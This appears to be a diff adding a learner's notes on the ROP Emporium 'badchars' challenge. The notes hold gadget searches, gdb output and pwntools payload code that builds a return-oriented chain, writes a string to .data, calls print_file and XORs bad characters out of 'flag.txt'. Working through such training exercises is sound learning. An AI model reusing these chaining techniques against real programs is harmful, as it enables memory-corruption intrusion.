@@ -1,0 +1,95 @@
+# Initial checks
+
+~/ python3 -c 'print(list(map(hex, map(ord, "xga."))))'
+['0x78', '0x67', '0x61', '0x2e']
+
+
+~/ ropper --file badchars --search "mov|pop"
+(bad chars) ~~0x0000000000400610: mov eax, 0; pop rbp; ret;~~
+0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;
+0x0000000000400634: mov qword ptr [r13], r12; ret;
+0x00000000004006a3: pop rdi; ret;
+
+
+gdb -batch -ex 'file ./badchars' -ex 'disassemble usefulGadgets'
+Dump of assembler code for function usefulGadgets:
+   0x0000000000400628 <+0>:     xor    BYTE PTR [r15],r14b
+   0x000000000040062b <+3>:     ret
+   0x000000000040062c <+4>:     add    BYTE PTR [r15],r14b
+   0x000000000040062f <+7>:     ret
+   0x0000000000400630 <+8>:     sub    BYTE PTR [r15],r14b
+   0x0000000000400633 <+11>:    ret
+   0x0000000000400634 <+12>:    mov    QWORD PTR [r13+0x0],r12
+   0x0000000000400638 <+16>:    ret
+   0x0000000000400639 <+17>:    nop    DWORD PTR [rax+0x0]
+
+
+
+rabin2 -S badchars |grep rw
+23  0x00001028   0x10 0x00601028   0x10 -rw- .data
+24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
+
+====
+====
+
+# Writing "12345678" in .data and calling "CRASHNOW"
+
+payload = b'A' * 40
+payload += pwn.p64(0x0040069c) # Call: {pop r12_13_14_15}
+payload += (b"12345678")
+payload += pwn.p64(0x00601028) # section .data
+payload += (b">>ARG3<<")
+payload += (b">>ARG4<<")
+payload += pwn.p64(0x00400634) # Call {mov qword [r13], r12}
+payload += (b"ENDFUNC!")
+
+(gdb) run < payload.txt
+-> R12 = "12345678" / R13 = .data / R14 = ">>ARG3<<" / R15 = ">>ARG4<<"
+(gdb) x/s $r13
+"12345678"
+(gdb) print (char*) $rsp
+$3 = 0x7fffffffdd38 "ENDFUNC!"
+
+====
+====
+# Calling print_file
+
+~/ rabin2 -i badchars
+1   0x00400500 GLOBAL FUNC       pwnme
+4   0x00400510 GLOBAL FUNC       print_file
+
+payload += pwn.p64(0x004006a3) # Call {pop rdi}
+payload += pwn.p64(0x00601028) # section .data
+payload += pwn.p64(0x00400510) # Call {print_file}
+
+(gdb) run < payload.txt
+Failed to open file: 12345678
+
+===
+===
+Current goal is to avoid badchars (".agx" in "./flag.txt")
+
+# XOR string
+idx_to_xor = (i for (i,c) in enumerate(TO_WRITE) if c in BADCHRS)
+xored_to_write = "".join(map(chr, [c ^ KEY if c in map(ord, BADCHRS) else c for c in map(ord, TO_WRITE)]))
+
+# UnXOR char
+xor_r15_addr_by_r14 = 0x000400628 # xor [r15], r14; ret
+rop.raw(rop.find_gadget(["pop r14", "pop r15", "ret"]))
+rop.raw(pwn.p64(KEY))
+rop.raw(addr)
+rop.raw(xor_r15_addr_by_r14)
+
+
+# Playing with the values
+I still faced some issues, xoring the flag helped avoiding some bad chars, but to do so I introduced more bad chars in the addresses I wanted to use.
+So it's a matter of finding a base address + XOR key that won't produce troubles.
+With 90 as a key, slightly increasing the input for .data, or using .bss worked
+
+Another solution would be to write to a valid fixed address and change it with more instructions
+~/ ropper --file badchars --search "add [r15]|sub [r15]"
+0x000000000040062c: add byte ptr [r15], r14b; ret;
+0x0000000000400630: sub byte ptr [r15], r14b; ret;
+
+./badchars32 < payload.txt
+Failed to open file: FILE
